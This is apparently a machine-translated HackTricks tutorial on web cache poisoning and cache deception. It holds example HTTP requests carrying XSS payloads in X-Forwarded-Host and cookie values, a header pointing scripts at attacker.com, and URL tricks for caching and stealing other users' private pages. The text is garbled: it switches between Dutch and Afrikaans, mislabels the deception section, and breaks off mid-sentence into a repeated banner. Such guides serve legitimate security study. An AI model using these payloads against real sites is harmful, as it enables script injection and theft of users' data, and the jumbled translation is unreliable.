# Cache-vergiftiging en Cache-misleiding

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere manieren om HackTricks te ondersteunen:

* Als je je **bedrijf wilt adverteren in HackTricks** of **HackTricks wilt downloaden in PDF-formaat**, bekijk dan de [**ABONNEMENTSPAKKETTEN**](https://github.com/sponsors/carlospolop)!
* Koop de [**offici√´le PEASS & HackTricks merchandise**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), onze collectie exclusieve [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit je aan bij de** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of de [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel je hacktrucs door PR's in te dienen bij de** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om eenvoudig workflows te bouwen en te automatiseren met behulp van 's werelds meest geavanceerde communitytools.\
Krijg vandaag nog toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Het verschil

> **Wat is het verschil tussen cache-vergiftiging en cache-misleiding?**
>
> * Bij **cache-vergiftiging** zorgt de aanvaller ervoor dat de applicatie schadelijke inhoud in de cache opslaat, en deze inhoud wordt vanuit de cache aan andere gebruikers van de applicatie geserveerd.
> * Bij **cache-misleiding** zorgt de aanvaller ervoor dat de applicatie gevoelige inhoud van een andere gebruiker in de cache opslaat, en de aanvaller haalt vervolgens deze inhoud uit de cache.

## Cache-vergiftiging

Cache-vergiftiging is gericht op het manipuleren van de cache aan de clientzijde om clients te dwingen onverwachte, gedeeltelijke of door een aanvaller gecontroleerde bronnen te laden. De omvang van de impact is afhankelijk van de populariteit van de getroffen pagina, aangezien de besmette respons uitsluitend wordt geserveerd aan gebruikers die de pagina bezoeken tijdens de periode van cache-verontreiniging.

De uitvoering van een cache-vergiftigingsaanval omvat verschillende stappen:

1. **Identificatie van niet-ge√Øndexeerde invoer**: Dit zijn parameters die, hoewel niet vereist voor een verzoek om in de cache te worden opgeslagen, de respons die door de server wordt teruggestuurd kunnen wijzigen. Het identificeren van deze invoer is cruciaal, omdat ze kunnen worden misbruikt om de cache te manipuleren.

2. **Misbruik van de niet-ge√Øndexeerde invoer**: Nadat de niet-ge√Øndexeerde invoer is ge√Ødentificeerd, omvat de volgende stap het achterhalen van hoe deze parameters kunnen worden misbruikt om de respons van de server op een manier te wijzigen die de aanvaller ten goede komt.

3. **Zorgen dat de vergiftigde respons in de cache wordt opgeslagen**: De laatste stap is ervoor te zorgen dat de gemanipuleerde respons in de cache wordt opgeslagen. Op deze manier ontvangt elke gebruiker die de getroffen pagina bezoekt terwijl de cache is vergiftigd, de besmette respons.

### Ontdekking: Controleer HTTP-headers

Gewoonlijk is er bij een respons die **in de cache is opgeslagen** een **header die dit aangeeft**, je kunt controleren op welke headers je moet letten in deze post: [**HTTP-cacheheaders**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Ontdekking: Caching van code 400

Als je denkt dat de respons in een cache wordt opgeslagen, kun je proberen **verzoeken te verzenden met een slechte header**, waarop normaal gesproken wordt gereageerd met een **statuscode 400**. Probeer vervolgens het verzoek normaal te openen en als de **respons een statuscode 400 is**, weet je dat het kwetsbaar is (en je kunt zelfs een DoS uitvoeren).\
Een slecht geconfigureerde header kan gewoon `\:` als een header zijn.\
Merk op dat deze soorten statuscodes soms niet in de cache worden opgeslagen, dus deze test is nutteloos.

### Ontdekking: Identificeer en evalueer niet-ge√Øndexeerde invoer

Je kunt [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) gebruiken om parameters en headers te **brute-forcen** die mogelijk de respons van de pagina **veranderen**. Bijvoorbeeld, een pagina kan de header `X-Forwarded-For` gebruiken om aan te geven dat de client het script van daar moet laden:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Lokaliseer 'n skadelike reaksie van die agterste bediener

Met die ge√Ødentifiseerde parameter/header, ondersoek hoe dit **gesaniteer** word en **waar** dit die respons van die header **be√Ønvloed**. Kan jy dit enigsins misbruik (voer 'n XSS uit of laai 'n JS-kode wat deur jou beheer word? Voer 'n DoS uit?...)

### Kry die gekasheerde respons

Sodra jy die **bladsy** ge√Ødentifiseer het wat misbruik kan word, asook die **parameter**/**header** wat gebruik moet word en **hoe** om dit te **misbruik**, moet jy die bladsy gekasheer kry. Afhangende van die bron wat jy in die kas wil kry, kan dit 'n rukkie neem en jy moet dalk vir verskeie sekondes probeer.\
Die **`X-Cache`**-header in die respons kan baie nuttig wees, aangesien dit die waarde **`miss`** kan h√™ wanneer die versoek nie gekasheer is nie, en die waarde **`hit`** wanneer dit gekasheer is.\
Die **`Cache-Control`**-header is ook interessant om te weet of 'n bron gekasheer word en wanneer die volgende keer sal wees dat die bron weer gekasheer sal word: `Cache-Control: public, max-age=1800`\
'n Ander interessante header is **`Vary`**. Hierdie header word dikwels gebruik om **bykomende headers aan te dui** wat as **deel van die kas-sleutel** beskou word, selfs al is hulle normaalweg nie sleutelwaardig nie. Daarom kan die gebruiker, as hy die `User-Agent` van die slagoffer ken, die kas vergiftig vir gebruikers wat daardie spesifieke `User-Agent` gebruik.\
'n Nog 'n header wat verband hou met die kas is **`Age`**. Dit definieer die tyd in sekondes wat die voorwerp in die proxy-kas was.

Wees **versigtig met die headers** wat jy gebruik wanneer jy 'n versoek kashier, omdat sommige van hulle **onverwags as sleutelwaardig gebruik kan word** en die slagoffer dieselfde header moet gebruik. Toets altyd 'n Kasvergiftiging met **verskillende webblaaie** om te sien of dit werk.

## Voorbeelde van uitbuiting

### Maklikste voorbeeld

'n Header soos `X-Forwarded-For` word ongesaniteer in die respons weerspie√´l.\
Jy kan 'n basiese XSS-lading stuur en die kas vergiftig sodat almal wat die bladsy besoek, XSS sal ervaar:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Merk op dat dit 'n versoek na `/en?region=uk` sal vergiftig en nie na `/en` nie_

### Gebruik van webgeheuevergiftiging om koekiehanteringskwesbaarhede uit te buit

Koekies kan ook weerspie√´l word in die respons van 'n bladsy. As jy dit kan misbruik om byvoorbeeld 'n XSS te veroorsaak, kan jy XSS moontlik uitbuit in verskeie kli√´nte wat die skadelike geheue-respons laai.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Let daarop dat as die kwesbare koekie baie deur die gebruikers gebruik word, sal gereelde versoekskakeling die cache skoonmaak.

### Gebruik van verskeie koptekste om webkaskadevergiftigingskwesbaarhede uit te buit <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Soms sal jy verskeie ongekenmerkte insette moet uitbuit om 'n kaskade te misbruik. Byvoorbeeld, jy kan 'n **Oop omleiding** vind as jy `X-Forwarded-Host` instel op 'n deur jou beheerde domein en `X-Forwarded-Scheme` op `http`. **As** die **bediener** al die **HTTP**-versoeke **na HTTPS stuur** en die koptekser `X-Forwarded-Scheme` gebruik as die domeinnaam vir die omleiding. Jy kan beheer waarheen die bladsy verwys word deur die omleiding.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Uitbuiting met beperkte `Vary`-header

As jy vind dat die **`X-Host`**-header gebruik word as **domeinnaam om 'n JS-hulpbron te laai**, maar die **`Vary`**-header in die respons dui op **`User-Agent`**, moet jy 'n manier vind om die User-Agent van die slagoffer uit te voer en die cache te vergiftig deur daardie gebruikersagent te gebruik:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Uitbuiting van HTTP-cachevergiftiging door misbruik van HTTP Request Smuggling

Leer hier hoe je [Cachevergiftigingsaanvallen kunt uitvoeren door misbruik te maken van HTTP Request Smuggling](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Geautomatiseerde testen voor Web Cache-vergiftiging

De [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) kan worden gebruikt om automatisch te testen op web cache-vergiftiging. Het ondersteunt veel verschillende technieken en is zeer aanpasbaar.

Voorbeeldgebruik: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om eenvoudig workflows te bouwen en te automatiseren met behulp van 's werelds meest geavanceerde communitytools.\
Krijg vandaag nog toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Kwetsbare voorbeelden

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS stuurde het fragment in de URL door zonder het te verwijderen en genereerde de cache-sleutel alleen met behulp van de host, het pad en de query (waarbij het fragment werd genegeerd). Dus het verzoek `/#/../?r=javascript:alert(1)` werd naar de backend gestuurd als `/#/../?r=javascript:alert(1)` en de cache-sleutel bevatte de payload niet, alleen de host, het pad en de query.

### GitHub CP-DoS

Het verzenden van een verkeerde waarde in de content-type header activeerde een 405 gecachte respons. De cache-sleutel bevatte de cookie, dus het was alleen mogelijk om niet-geauthenticeerde gebruikers aan te vallen.

### GitLab + GCP CP-DoS

GitLab gebruikt GCP-buckets om statische inhoud op te slaan. **GCP Buckets** ondersteunen de **header `x-http-method-override`**. Het was dus mogelijk om de header `x-http-method-override: HEAD` te verzenden en de cache te vergiftigen zodat een lege responsbody werd geretourneerd. Het kon ook de methode `PURGE` ondersteunen.

### Rack Middleware (Ruby on Rails)

In Ruby on Rails-toepassingen wordt vaak gebruik gemaakt van Rack-middleware. Het doel van de Rack-code is om de waarde van de **`x-forwarded-scheme`** header te nemen en deze als het schema van het verzoek in te stellen. Wanneer de header `x-forwarded-scheme: http` wordt verzonden, vindt er een 301-omleiding naar dezelfde locatie plaats, wat mogelijk kan leiden tot een Denial of Service (DoS) voor die bron. Bovendien kan de applicatie de `X-forwarded-host` header herkennen en gebruikers doorverwijzen naar de opgegeven host. Dit gedrag kan leiden tot het laden van JavaScript-bestanden vanaf de server van een aanvaller, wat een beveiligingsrisico vormt.

### 403 en Storage Buckets

Cloudflare heeft eerder 403-responses in de cache opgeslagen. Als er werd geprobeerd om toegang te krijgen tot S3- of Azure Storage Blobs met onjuiste Autorisatie-headers, resulteerde dit in een 403-respons die werd gecachet. Hoewel Cloudflare is gestopt met het cachen van 403-responses, kan dit gedrag nog steeds aanwezig zijn in andere proxy-services.

### Injecteren van gesleutelde parameters

Caches bevatten vaak specifieke GET-parameters in de cache-sleutel. Bijvoorbeeld, Fastly's Varnish cachte de `size` parameter in verzoeken. Als echter een URL-gecodeerde versie van de parameter (bijv. `siz%65`) ook werd verzonden met een onjuiste waarde, zou de cache-sleutel worden geconstrueerd met behulp van de juiste `size` parameter. Maar de backend zou de waarde verwerken in de URL-gecodeerde parameter. Het URL-coderen van de tweede `size` parameter leidde ertoe dat deze door de cache werd weggelaten maar door de backend werd gebruikt. Het toewijzen van een waarde van 0 aan deze parameter resulteerde in een cachebare 400 Bad Request-fout.

### User Agent-regels

Sommige ontwikkelaars blokkeren verzoeken met user-agents die overeenkomen met die van veelgebruikte tools zoals FFUF of Nuclei om de serverbelasting te beheren. Ironisch genoeg kan deze aanpak kwetsbaarheden introduceren zoals cachevergiftiging en DoS.

### Onwettige header-velden

De [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) specificeert de acceptabele tekens in kopernamen. Headers die tekens bevatten buiten het gespecificeerde **tchar**-bereik zouden idealiter een 400 Bad Request-respons moeten activeren. In de praktijk houden servers zich echter niet altijd aan deze standaard. Een opmerkelijk voorbeeld hiervan is Akamai, dat headers met ongeldige tekens doorstuurt en elke 400-fout in de cache plaatst, zolang de `cache-control` header niet aanwezig is. Er werd een uitbuitbaar patroon ge√Ødentificeerd waarbij het verzenden van een header met een ongeldig teken, zoals `\`, zou resulteren in een cachebare 400 Bad Request-fout.

### Het vinden van nieuwe headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cachevergiftiging

Het doel van Cachevergiftiging is om clients **bronnen te laten laden die worden opgeslagen door de cache met hun gevoelige informatie**.

Allereerst moet worden opgemerkt dat **extensies** zoals `.css`, `.js`, `.png`, enz. meestal zijn **geconfigureerd** om te worden **opgeslagen** in de **cache**. Daarom, als je toegang krijgt tot `www.example.com/profile.php/nonexistent.js`, zal de cache waarschijnlijk de respons opslaan omdat het de extensie `.js` ziet. Maar als de **applicatie** de **gevoelige** gebruikersinhoud die is opgeslagen in _www.example.com/profile.php_ herhaalt, kun je die inhoud stelen van andere gebruikers.

Andere dingen om te testen:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Gebruik minder bekende extensies zoals_ `.avif`

Een ander zeer duidelijk voorbeeld is te vinden in deze write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
In het voorbeeld wordt uitgelegd dat als je een niet-bestaande pagina laadt zoals _http://www.example.com/home.php/non-existent.css_, de inhoud van _http://www.example.com/home.php_ (**met de gevoelige informatie van de gebruikers**) zal worden geretourneerd en de cache-server zal het resultaat opslaan.\
Vervolgens kan de **aanvaller** toegang krijgen tot _http://www.example.com/home.php/non-existent.css_ in hun eigen browser en de **vertrouwelijke informatie** van de gebruikers die eerder toegang hebben gekregen, observeren.

Let op dat de **cache-proxy** moet worden **geconfigureerd** om bestanden **te cachen** op basis van de **extensie** van het bestand (_.css_) en niet op basis van het content-type. In het voor
<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
